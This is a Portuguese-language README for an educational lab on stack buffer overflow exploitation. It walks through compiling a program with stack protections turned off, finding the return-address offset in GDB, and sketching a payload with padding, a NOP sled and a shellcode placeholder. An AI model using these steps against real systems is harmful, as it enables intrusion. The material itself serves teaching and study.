# Buffer Overflow - Exploração de Vulnerabilidades

Este repositório contém um estudo prático sobre Buffer Overflow, abordando os conceitos fundamentais e demonstrando a exploração de uma vulnerabilidade de estouro de buffer.

## 🚨 Aviso Importante
Este material é **estritamente educacional** e deve ser utilizado **apenas** em ambientes controlados para fins de aprendizado. Qualquer uso inadequado, fora dos propósitos acadêmicos, pode ser ilegal.

---

## 📌 Introdução
O **Buffer Overflow** ocorre quando um programa escreve dados além dos limites de um buffer, sobrescrevendo áreas adjacentes da memória. Esse comportamento pode ser explorado para modificar o fluxo de execução do programa e, em alguns casos, obter controle total sobre o sistema.

---

## 🛠️ Configuração do Ambiente
Antes de iniciar, certifique-se de estar em um ambiente Linux com as ferramentas necessárias instaladas:

- **GCC** (Compilador de C)
- **GDB** (Depurador GNU)
- **Python** (para geração de payloads)
- **objdump** (para análise de binários)

Caso algum desses pacotes não esteja instalado, use:
```bash
sudo apt update && sudo apt install gcc gdb python3 binutils -y
```

---

## 🔧 Passo a Passo da Exploração

### 1️⃣ Compilação do Programa
Compile o código vulnerável desativando proteções de pilha para facilitar a exploração:
```bash
gcc -fno-stack-protector -z execstack -o vulneravel vulneravel.c
```
- `-fno-stack-protector`: Desativa a proteção de pilha do compilador.
- `-z execstack`: Permite execução de código na pilha.

### 2️⃣ Análise do Programa
Use um depurador para identificar padrões e vulnerabilidades:
```bash
gdb ./vulneravel
```
No GDB, analise a disposição da pilha e descubra o endereço de retorno:
```gdb
run $(python3 -c 'print("A"*200)')
info frame
```
Isso ajudará a determinar quantos bytes são necessários para sobrescrever o endereço de retorno.

### 3️⃣ Criação do Payload
Crie um payload que sobrescreva o endereço de retorno e redirecione a execução para um shellcode. Exemplo em Python:
```python
payload = b"A" * 140  # Preenchimento até o endereço de retorno
payload += b"\x90" * 16  # NOP Sled
payload += b"<shellcode>"  # Código malicioso
```
Substitua `<shellcode>` por um código adequado, como um shell `/bin/sh`.

### 4️⃣ Execução do Ataque
Passe o payload como argumento para explorar a vulnerabilidade:
```bash
./vulneravel $(python3 -c 'print("A"*140 + "\xef\xbe\xad\xde")')
```
Se bem-sucedido, isso pode conceder uma shell interativa ao atacante.

---
